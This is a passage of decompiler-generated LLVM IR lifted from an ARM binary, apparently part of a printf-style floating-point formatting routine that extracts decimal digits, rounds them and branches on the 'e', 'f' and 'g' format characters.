  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_169f8 = icmp eq i1 %v6_169f4, false
  store i1 %v2_169f8, i1* %cpsr_z.global-to-local, align 1
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16be0

bb227:                                            ; preds = %dec_label_pc_169bc
  %v10_16a50 = fmul double %arg2, 0x3FD0000000020EB4
  %v11_16a50 = fptrunc double %v10_16a50 to float
  %v12_16a50 = bitcast float %v11_16a50 to i32
  store i32 %v12_16a50, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v6_16a64 = fcmp olt double %v10_16a50, %arg2
  %v7_16a64 = fcmp oeq double %v10_16a50, %arg2
  %v8_16a64 = select i1 %v6_16a64, i32 1, i32 -1
  %v9_16a64 = select i1 %v7_16a64, i32 0, i32 %v8_16a64
  store i32 %v9_16a64, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16a68 = icmp slt i32 %v9_16a64, 0
  store i1 %v1_16a68, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16a64, label %dec_label_pc_16a70, label %dec_label_pc_16ab4

dec_label_pc_16a70:                               ; preds = %bb226, %bb227
  %v0_169a0.v1_169b48 = phi i32 [ 0, %bb227 ], [ 8, %bb226 ]
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v2_16a78 = add i32 %arg4, 16
  %v3_16a78 = inttoptr i32 %v2_16a78 to i32*
  store i32 32, i32* %v3_16a78, align 4
  %v0_16a80 = load i32, i32* %sl.global-to-local, align 4
  %v1_16a80 = add i32 %v0_16a80, -96
  %v3_16a80 = sub i32 95, %v0_16a80
  %v4_16a80 = and i32 %v3_16a80, %v0_16a80
  %v5_16a80 = icmp slt i32 %v4_16a80, 0
  store i1 %v5_16a80, i1* %cpsr_v.global-to-local, align 1
  %v6_16a80 = icmp slt i32 %v1_16a80, 0
  store i1 %v6_16a80, i1* %cpsr_n.global-to-local, align 1
  %v7_16a80 = icmp eq i32 %v0_16a80, 96
  store i1 %v7_16a80, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp286 = icmp ult i32 %v0_16a80, 97
  br i1 %tmp286, label %bb228, label %.thread127

bb228:                                            ; preds = %dec_label_pc_16a70
  %v5_16a94 = or i32 %v0_169a0.v1_169b48, 4
  store i32 %v5_16a94, i32* %r3.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_16a70, %bb228
  %v4_16a98 = phi i32 [ %v5_16a94, %bb228 ], [ 3, %dec_label_pc_16a70 ]
  %v4_16a98.v0_169a0.v1_169b4 = select i1 %tmp286, i32 %v4_16a98, i32 %v0_169a0.v1_169b48
  store i32 ptrtoint ([4 x i8]* @global_var_20eb4.1252 to i32), i32* %r2.global-to-local, align 4
  %v2_16aa4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_16aa4, i32* %r6.global-to-local, align 4
  %v2_16aa8 = add i32 %v4_16a98.v0_169a0.v1_169b4, ptrtoint ([4 x i8]* @global_var_20eb4.1252 to i32)
  store i32 %v2_16aa8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16fec

dec_label_pc_16ab4:                               ; preds = %bb227
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16b84

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b84, %dec_label_pc_16ab4
  %v0_16b8c = phi i32 [ 256, %dec_label_pc_16ab4 ], [ %v3_16b8c, %dec_label_pc_16b84 ]
  %v0_16b48 = phi i32 [ %tmp183, %dec_label_pc_16ab4 ], [ %v11_16b50, %dec_label_pc_16b84 ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_16ab4 ], [ %v2_16b74, %dec_label_pc_16b84 ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_16ab4 ], [ %v1_16ae8, %dec_label_pc_16b84 ]
  %v1_16ae8 = add nsw i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_20ec8.1255 to i32), i32* %r2.global-to-local, align 4
  %v3_16afc = mul i32 %v1_16ae8, 8
  store i32 %v3_16afc, i32* %r3.global-to-local, align 4
  store i32 %v0_16b48, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v2_16b08 = add i32 %v3_16afc, ptrtoint (i32* @global_var_20ec8.1255 to i32)
  store i32 %v2_16b08, i32* %ip.global-to-local, align 4
  %v1_16b10 = inttoptr i32 %v2_16b08 to i32*
  %v2_16b10 = load i32, i32* %v1_16b10, align 4
  %v3_16b10 = sext i32 %v2_16b10 to i64
  %v1_16b48 = sext i32 %v0_16b48 to i64
  %v2_16b48 = bitcast i64 %v1_16b48 to double
  %v8_16b50 = bitcast i64 %v3_16b10 to double
  %v9_16b50 = fdiv double %v2_16b48, %v8_16b50
  %v10_16b50 = fptrunc double %v9_16b50 to float
  %v11_16b50 = bitcast float %v10_16b50 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v11_16b50, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  %v6_16b64 = fcmp ogt double %v9_16b50, 0x4CBEBC20
  %v7_16b64 = zext i1 %v6_16b64 to i32
  store i32 %v7_16b64, i32* %r0.global-to-local, align 4
  %v2_16b74 = add i32 %stack_var_-192.2, %v0_16b8c
  store i32 %v2_16b74, i32* %r1.global-to-local, align 4
  store i32 %v11_16b50, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %v1_16ae8, i32* %r2.global-to-local, align 4
  %v2_16b88 = icmp eq i32 %v1_16ae8, 0
  %v3_16b8c = sdiv i32 %v0_16b8c, 2
  br i1 %v2_16b88, label %dec_label_pc_16b94, label %dec_label_pc_16b84

dec_label_pc_16b94:                               ; preds = %dec_label_pc_16b84
  %v6_16ba4 = fcmp ogt double %v9_16b50, 0x4E6E6B2A
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16ba8 = icmp eq i1 %v6_16ba4, false
  store i1 %v2_16ba8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 1092616194, i32* %r2.global-to-local, align 4
  %v10_16bc8 = fdiv double %v9_16b50, 0x4024000041F00000
  %v11_16bc8 = fptrunc double %v10_16bc8 to float
  %v12_16bc8 = bitcast float %v11_16bc8 to i32
  store i32 %v12_16bc8, i32* %r0.global-to-local, align 4
  store i32 520, i32* %r3.global-to-local, align 4
  store i32 %v12_16bc8, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %dec_label_pc_169d8, %dec_label_pc_16b94
  %v0_16bec73 = phi i32 [ %tmp183, %dec_label_pc_169d8 ], [ %v12_16bc8, %dec_label_pc_16b94 ]
  %stack_var_-192.6 = phi i32 [ -1, %dec_label_pc_169d8 ], [ 520, %dec_label_pc_16b94 ]
  %v2_16be0 = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_16be0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16be8

dec_label_pc_16be8:                               ; preds = %dec_label_pc_16c7c.dec_label_pc_16be8_crit_edge, %dec_label_pc_16be0
  %v0_16c20 = phi i32 [ %v0_16bec.pre, %dec_label_pc_16c7c.dec_label_pc_16be8_crit_edge ], [ %v0_16bec73, %dec_label_pc_16be0 ]
  %v0_16c24 = phi i32 [ %v0_16be8.pre, %dec_label_pc_16c7c.dec_label_pc_16be8_crit_edge ], [ %arg3, %dec_label_pc_16be0 ]
  store i32 %v0_16c24, i32* %r1.global-to-local, align 4
  %v1_16bf0 = sext i32 %v0_16c20 to i64
  %v2_16bf0 = bitcast i64 %v1_16bf0 to double
  %v3_16bf0 = fptoui double %v2_16bf0 to i32
  store i32 %v3_16bf0, i32* %r4.global-to-local, align 4
  store i32 %v3_16bf0, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16bfc = icmp slt i32 %v3_16bf0, 0
  store i1 %v1_16bfc, i1* %cpsr_n.global-to-local, align 1
  %v2_16bfc = icmp eq i32 %v3_16bf0, 0
  store i1 %v2_16bfc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16c24, i32* %r3.global-to-local, align 4
  br i1 %v1_16bfc, label %dec_label_pc_16c0c, label %dec_label_pc_16c20

dec_label_pc_16c0c:                               ; preds = %dec_label_pc_16be8
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000020EB7) to float) to i32), i32* %r0.global-to-local, align 4
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F0000000020EB7) to float) to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_16c24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c20

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16be8, %dec_label_pc_16c0c
  store i32 %v0_16c20, i32* @r0, align 4
  store i32 %v0_16c24, i32* %r1.global-to-local, align 4
  %v1_16c28 = fptrunc double %v2_16bf0 to float
  %v2_16c28 = bitcast float %v1_16c28 to i32
  %v4_16c28 = call i32 @__aeabi_dsub(i32 %v2_16c28, i32 %v0_16c24)
  %v5_16c28 = sext i32 %v4_16c28 to i64
  store i32 1315859242, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_16c34 = bitcast i64 %v5_16c28 to double
  %v9_16c34 = fmul double %v3_16c34, 0x41CDCD6540240000
  %v10_16c34 = fptrunc double %v9_16c34 to float
  %v11_16c34 = bitcast float %v10_16c34 to i32
  store i32 %v11_16c34, i32* %r0.global-to-local, align 4
  %v0_16c38 = load i32, i32* %sb.global-to-local, align 4
  %v1_16c38 = add i32 %v0_16c38, 9
  store i32 %v1_16c38, i32* %sb.global-to-local, align 4
  store i32 %v11_16c34, i32* %r6.global-to-local, align 4
  store i32 %v0_16c24, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_16c48.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16c48

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c48.dec_label_pc_16c48_crit_edge, %dec_label_pc_16c20
  %v1_16c5c = phi i32 [ %v1_16c5c.pre, %dec_label_pc_16c48.dec_label_pc_16c48_crit_edge ], [ %v1_16c38, %dec_label_pc_16c20 ]
  %v0_16c54 = phi i32 [ %v0_16c70, %dec_label_pc_16c48.dec_label_pc_16c48_crit_edge ], [ 0, %dec_label_pc_16c20 ]
  %v0_16c60 = phi i32 [ %v2_16c6c, %dec_label_pc_16c48.dec_label_pc_16c48_crit_edge ], [ %v0_16c48.pre, %dec_label_pc_16c20 ]
  %v2_16c50 = urem i32 %v0_16c60, 10
  %v1_16c54 = add i32 %v0_16c54, 1
  store i32 %v1_16c54, i32* %r5.global-to-local, align 4
  %v1_16c58 = or i32 %v2_16c50, 48
  store i32 %v1_16c58, i32* %r2.global-to-local, align 4
  %v2_16c5c = sub i32 %v1_16c5c, %v1_16c54
  store i32 %v2_16c5c, i32* %r3.global-to-local, align 4
  store i32 %v0_16c60, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_16c68 = trunc i32 %v1_16c58 to i8
  %v3_16c68 = inttoptr i32 %v2_16c5c to i8*
  store i8 %v1_16c68, i8* %v3_16c68, align 1
  %v0_16c6c = load i32, i32* %r0.global-to-local, align 4
  %v1_16c6c = load i32, i32* %r1.global-to-local, align 4
  %v2_16c6c = udiv i32 %v0_16c6c, %v1_16c6c
  store i32 %v2_16c6c, i32* %r0.global-to-local, align 4
  %v0_16c70 = load i32, i32* %r5.global-to-local, align 4
  %v1_16c70 = add i32 %v0_16c70, -8
  %v3_16c70 = sub i32 7, %v0_16c70
  %v4_16c70 = and i32 %v3_16c70, %v0_16c70
  %v5_16c70 = icmp slt i32 %v4_16c70, 0
  store i1 %v5_16c70, i1* %cpsr_v.global-to-local, align 1
  %v6_16c70 = icmp slt i32 %v1_16c70, 0
  store i1 %v6_16c70, i1* %cpsr_n.global-to-local, align 1
  %v7_16c70 = icmp eq i32 %v0_16c70, 8
  store i1 %v7_16c70, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16c6c, i32* %r4.global-to-local, align 4
  %v7_16c78 = icmp slt i32 %v0_16c70, 9
  br i1 %v7_16c78, label %dec_label_pc_16c48.dec_label_pc_16c48_crit_edge, label %dec_label_pc_16c7c

dec_label_pc_16c48.dec_label_pc_16c48_crit_edge:  ; preds = %dec_label_pc_16c48
  %v1_16c5c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_16c48

dec_label_pc_16c7c:                               ; preds = %dec_label_pc_16c48
  %v0_16c7c = load i32, i32* %r8.global-to-local, align 4
  %v1_16c7c = add i32 %v0_16c7c, 1
  store i32 %v1_16c7c, i32* %r8.global-to-local, align 4
  %v3_16c80 = sub i32 -1, %v0_16c7c
  %v4_16c80 = and i32 %v1_16c7c, %v3_16c80
  %v5_16c80 = icmp slt i32 %v4_16c80, 0
  store i1 %v5_16c80, i1* %cpsr_v.global-to-local, align 1
  %v6_16c80 = icmp slt i32 %v0_16c7c, 0
  store i1 %v6_16c80, i1* %cpsr_n.global-to-local, align 1
  %v7_16c80 = icmp eq i32 %v0_16c7c, 0
  store i1 %v7_16c80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16c80, label %dec_label_pc_16c7c.dec_label_pc_16be8_crit_edge, label %dec_label_pc_16c88

dec_label_pc_16c7c.dec_label_pc_16be8_crit_edge:  ; preds = %dec_label_pc_16c7c
  %v0_16be8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_16bec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16be8

dec_label_pc_16c88:                               ; preds = %dec_label_pc_16c7c
  %v0_16c88 = load i32, i32* %sl.global-to-local, align 4
  %v1_16c88 = add i32 %v0_16c88, -96
  %v3_16c88 = sub i32 95, %v0_16c88
  %v4_16c88 = and i32 %v3_16c88, %v0_16c88
  %v5_16c88 = icmp slt i32 %v4_16c88, 0
  store i1 %v5_16c88, i1* %cpsr_v.global-to-local, align 1
  %v6_16c88 = icmp slt i32 %v1_16c88, 0
  store i1 %v6_16c88, i1* %cpsr_n.global-to-local, align 1
  %v7_16c88 = icmp eq i32 %v0_16c88, 96
  store i1 %v7_16c88, i1* %cpsr_z.global-to-local, align 1
  %tmp287 = icmp ult i32 %v0_16c88, 97
  store i32 %v1_16cb8, i32* %ip.global-to-local, align 4
  br i1 %tmp287, label %bb229, label %thread-pre-split

bb229:                                            ; preds = %dec_label_pc_16c88
  %v5_16c98 = add i32 %v0_16c88, 32
  store i32 %v5_16c98, i32* %r3.global-to-local, align 4
  %v5_16c9c = urem i32 %v5_16c98, 256
  store i32 %v5_16c9c, i32* %sl.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_16c88, %bb229
  %v0_16cc0 = phi i32 [ %v5_16c9c, %bb229 ], [ %v0_16c88, %dec_label_pc_16c88 ]
  %stack_var_-58.0131138 = phi i32 [ 69, %bb229 ], [ 101, %dec_label_pc_16c88 ]
  %v7_16ca0 = icmp eq i32 %v0_16cc0, 103
  %. = zext i1 %v7_16ca0 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16cac = icmp slt i32 %v1_16cb8, 0
  store i1 %v1_16cac, i1* %cpsr_n.global-to-local, align 1
  %v2_16cac = icmp eq i32 %v1_16cb8, 0
  store i1 %v2_16cac, i1* %cpsr_z.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_16cb8, 1
  br i1 %tmp232, label %.thread12, label %bb233

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb235

bb233:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16cb4 = icmp eq i1 %v7_16ca0, false
  store i1 %v2_16cb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16cb4, label %bb235, label %bb234

bb234:                                            ; preds = %bb233
  %v2_16cb8 = add i32 %v1_16cb8, -1
  store i32 %v2_16cb8, i32* %ip.global-to-local, align 4
  br label %bb235

bb235:                                            ; preds = %.thread12, %bb233, %bb234
  %v0_16cbc = phi i32 [ %v1_16cb8, %.thread12 ], [ %v1_16cb8, %bb233 ], [ %v2_16cb8, %bb234 ]
  %v1_16cc0 = add i32 %v0_16cc0, -102
  %v3_16cc0 = sub i32 101, %v0_16cc0
  %v4_16cc0 = and i32 %v3_16cc0, %v0_16cc0
  %v5_16cc0 = icmp slt i32 %v4_16cc0, 0
  store i1 %v5_16cc0, i1* %cpsr_v.global-to-local, align 1
  %v6_16cc0 = icmp slt i32 %v1_16cc0, 0
  store i1 %v6_16cc0, i1* %cpsr_n.global-to-local, align 1
  %v7_16cc0 = icmp eq i32 %v0_16cc0, 102
  store i1 %v7_16cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16cc0, label %dec_label_pc_16ccc, label %bb236

bb236:                                            ; preds = %bb235
  store i32 %v0_16cbc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16cf8

dec_label_pc_16ccc:                               ; preds = %bb235
  store i32 %v0_16cbc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_16cd4 = add i32 %v0_16cbc, %stack_var_-192.6
  store i32 %v2_16cd4, i32* %ip.global-to-local, align 4
  %v1_16cd8 = add i32 %v2_16cd4, 1
  %v3_16cd8 = sub i32 0, %v2_16cd4
  %v4_16cd8 = and i32 %v1_16cd8, %v3_16cd8
  %v5_16cd8 = icmp slt i32 %v4_16cd8, 0
  store i1 %v5_16cd8, i1* %cpsr_v.global-to-local, align 1
  %v6_16cd8 = icmp slt i32 %v1_16cd8, 0
  store i1 %v6_16cd8, i1* %cpsr_n.global-to-local, align 1
  %v7_16cd8 = icmp eq i32 %v1_16cd8, 0
  store i1 %v7_16cd8, i1* %cpsr_z.global-to-local, align 1
  %v2_16cdc = xor i1 %v6_16cd8, %v5_16cd8
  br i1 %v2_16cdc, label %dec_label_pc_16ce0, label %dec_label_pc_16cf8

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16ccc
  %v2_16ce0 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_16ce0, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_16cec = bitcast i32* %stack_var_-79 to i8*
  %v3_16cec = call i32 @__GI_memset(i8* %v2_16cec, i32 48)
  store i32 %v3_16cec, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16cf8

dec_label_pc_16cf8:                               ; preds = %bb236, %dec_label_pc_16ccc, %dec_label_pc_16ce0
  %v1_16d3c88 = phi i32 [ %v3_16cec, %dec_label_pc_16ce0 ], [ %v0_16cbc, %dec_label_pc_16ccc ], [ %v2_16c6c, %bb236 ]
  %v1_16d20 = phi i32 [ -1, %dec_label_pc_16ce0 ], [ %v2_16cd4, %dec_label_pc_16ccc ], [ %v0_16cbc, %bb236 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_16ce0 ], [ %stack_var_-192.6, %dec_label_pc_16ccc ], [ %stack_var_-192.6, %bb236 ]
  %v1_16cfc = add i32 %v1_16d20, -16
  %v3_16cfc = sub i32 15, %v1_16d20
  %v4_16cfc = and i32 %v3_16cfc, %v1_16d20
  %v5_16cfc = icmp slt i32 %v4_16cfc, 0
  store i1 %v5_16cfc, i1* %cpsr_v.global-to-local, align 1
  %v6_16cfc = icmp slt i32 %v1_16cfc, 0
  store i1 %v6_16cfc, i1* %cpsr_n.global-to-local, align 1
  %v7_16cfc = icmp eq i32 %v1_16d20, 16
  store i1 %v7_16cfc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_16d08 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_16d08, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_16d10 = xor i1 %v6_16cfc, %v5_16cfc
  %v4_16d10 = or i1 %v7_16cfc, %v3_16d10
  br i1 %v4_16d10, label %dec_label_pc_16d1c, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_16cf8
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_16d14152 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_16d14152, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_16d1c:                               ; preds = %dec_label_pc_16cf8
  %v2_16d1c = ptrtoint i32* %stack_var_-78 to i32
  %v2_16d20 = add i32 %v1_16d20, %v2_16d1c
  store i32 %v2_16d20, i32* %r3.global-to-local, align 4
  %v1_16d24 = add i32 %v2_16d20, 2
  %v2_16d24 = inttoptr i32 %v1_16d24 to i8*
  %v3_16d24 = load i8, i8* %v2_16d24, align 1
  %v4_16d24 = zext i8 %v3_16d24 to i32
  store i32 %v4_16d24, i32* %r2.global-to-local, align 4
  store i32 %v1_16d24, i32* %r1.global-to-local, align 4
  %v2_16d2c = icmp ugt i8 %v3_16d24, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16d2c = icmp ult i8 %v3_16d24, 52
  store i1 %v6_16d2c, i1* %cpsr_n.global-to-local, align 1
  %v7_16d2c = icmp eq i8 %v3_16d24, 52
  store i1 %v7_16d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d30 = xor i1 %v2_16d2c, true
  %v3_16d30 = or i1 %v7_16d2c, %v2_16d30
  br i1 %v3_16d30, label %bb237, label %bb238

bb237:                                            ; preds = %dec_label_pc_16d1c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb238

bb238:                                            ; preds = %dec_label_pc_16d1c, %bb237
  %v1_16d3c86 = phi i32 [ %v1_16d3c88, %dec_label_pc_16d1c ], [ 0, %bb237 ]
  %v2_16d34 = xor i1 %v7_16d2c, true
  %v3_16d34 = and i1 %v2_16d2c, %v2_16d34
  br i1 %v3_16d34, label %bb239, label %.preheader

bb239:                                            ; preds = %bb238
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb238, %bb239, %..preheader_crit_edge, %.backedge
  %v1_16d3c = phi i32 [ %v1_16d3c.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_16d3c86, %bb238 ], [ 1, %bb239 ]
  %v0_16d38 = phi i32 [ %v0_16d44, %.backedge ], [ %v7_16d14152, %..preheader_crit_edge ], [ %v1_16d24, %bb238 ], [ %v1_16d24, %bb239 ]
  %v1_16d38 = add i32 %v0_16d38, -1
  %v2_16d38 = inttoptr i32 %v1_16d38 to i8*
  %v3_16d38 = load i8, i8* %v2_16d38, align 1
  %v4_16d38 = zext i8 %v3_16d38 to i32
  store i32 %v1_16d38, i32* %r1.global-to-local, align 4
  %v2_16d3c = add i32 %v4_16d38, %v1_16d3c
  store i32 %v2_16d3c, i32* %r3.global-to-local, align 4
  %v1_16d40 = trunc i32 %v2_16d3c to i8
  store i8 %v1_16d40, i8* %v2_16d38, align 1
  %v0_16d44 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d44 = inttoptr i32 %v0_16d44 to i8*
  %v2_16d44 = load i8, i8* %v1_16d44, align 1
  %v3_16d44 = zext i8 %v2_16d44 to i32
  store i32 %v3_16d44, i32* %r2.global-to-local, align 4
  %v2_16d48 = icmp ugt i8 %v2_16d44, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16d48 = icmp ult i8 %v2_16d44, 57
  store i1 %v6_16d48, i1* %cpsr_n.global-to-local, align 1
  %v7_16d48 = icmp eq i8 %v2_16d44, 57
  store i1 %v7_16d48, i1* %cpsr_z.global-to-local, align 1
  %v2_16d4c = xor i1 %v2_16d48, true
  %v3_16d4c = or i1 %v7_16d48, %v2_16d4c
  br i1 %v3_16d4c, label %bb240, label %bb241

bb240:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb241

bb241:                                            ; preds = %.preheader, %bb240
  %v2_16d50 = xor i1 %v7_16d48, true
  %v3_16d50 = and i1 %v2_16d48, %v2_16d50
  br i1 %v3_16d50, label %bb242, label %._crit_edge

._crit_edge:                                      ; preds = %bb241
  %v1_16d58.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb243

bb242:                                            ; preds = %bb241
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb243

bb243:                                            ; preds = %._crit_edge, %bb242
  %v1_16d58 = phi i32 [ %v1_16d58.pre, %._crit_edge ], [ 1, %bb242 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_16d54 = icmp ult i8 %v2_16d44, 48
  store i1 %v6_16d54, i1* %cpsr_n.global-to-local, align 1
  %v7_16d54 = icmp eq i8 %v2_16d44, 48
  store i1 %v7_16d54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16d54, label %.thread17, label %bb244

.thread17:                                        ; preds = %bb243
  %v2_16d58 = or i32 %v1_16d58, 1
  store i32 %v2_16d58, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16d5c18 = icmp slt i32 %v2_16d58, 0
  store i1 %v1_16d5c18, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb244:                                            ; preds = %bb243
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16d5c = icmp slt i32 %v1_16d58, 0
  store i1 %v1_16d5c, i1* %cpsr_n.global-to-local, align 1
  %v2_16d5c = icmp eq i32 %v1_16d58, 0
  store i1 %v2_16d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16d5c, label %dec_label_pc_16d64, label %.backedge

.backedge:                                        ; preds = %bb244, %.thread17
  %v1_16d3c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_16d64:                               ; preds = %bb244
  store i32 %v2_16d08, i32* %r2.global-to-local, align 4
  %v2_16d68 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_16d68, i32* %r3.global-to-local, align 4
  %v2_16d6c = sub i32 %v0_16d44, %v2_16d68
  %v3_16d6c = icmp uge i32 %v0_16d44, %v2_16d68
  %v4_16d6c = xor i32 %v0_16d44, %v2_16d68
  %v5_16d6c = xor i32 %v2_16d6c, %v0_16d44
  %v6_16d6c = and i32 %v5_16d6c, %v4_16d6c
  %v7_16d6c = icmp slt i32 %v6_16d6c, 0
  store i1 %v7_16d6c, i1* %cpsr_v.global-to-local, align 1
  %v8_16d6c = icmp slt i32 %v2_16d6c, 0
  store i1 %v8_16d6c, i1* %cpsr_n.global-to-local, align 1
  %v9_16d6c = icmp eq i32 %v0_16d44, %v2_16d68
  store i1 %v9_16d6c, i1* %cpsr_z.global-to-local, align 1
  %v2_16d70 = xor i1 %v3_16d6c, true
  %v3_16d70 = or i1 %v9_16d6c, %v2_16d70
  br i1 %v3_16d70, label %bb245, label %.thread162

bb245:                                            ; preds = %dec_label_pc_16d64
  store i32 %v2_16d68, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_16d68, i32* %r1.global-to-local, align 4
  br label %.thread162

.thread162:                                       ; preds = %dec_label_pc_16d64, %bb245
  %v4_16d80160 = phi i32 [ %stack_var_-192.7, %bb245 ], [ %v2_16d68, %dec_label_pc_16d64 ]
  %v2_16d90 = phi i32 [ %v2_16d68, %bb245 ], [ %v0_16d44, %dec_label_pc_16d64 ]
  %v4_16d84154159 = phi i32 [ %v2_16d68, %bb245 ], [ %v2_16d08, %dec_label_pc_16d64 ]
  %v2_16d7c = xor i1 %v9_16d6c, true
  %v3_16d7c = and i1 %v3_16d6c, %v2_16d7c
  br i1 %v3_16d7c, label %bb246, label %bb247

bb246:                                            ; preds = %.thread162
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb247

bb247:                                            ; preds = %.thread162, %bb246
  br i1 %v3_16d70, label %bb248, label %bb249

bb248:                                            ; preds = %bb247
  %v5_16d80 = add i32 %v4_16d80160, 1
  store i32 %v5_16d80, i32* %r0.global-to-local, align 4
  br label %bb249

bb249:                                            ; preds = %bb247, %bb248
  br i1 %v3_16d7c, label %bb250, label %bb251

bb250:                                            ; preds = %bb249
  %v5_16d84 = add i32 %v4_16d84154159, 2
  store i32 %v5_16d84, i32* %r2.global-to-local, align 4
  br label %bb251

bb251:                                            ; preds = %bb249, %bb250
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16d8c = load i32, i32* %sl.global-to-local, align 4
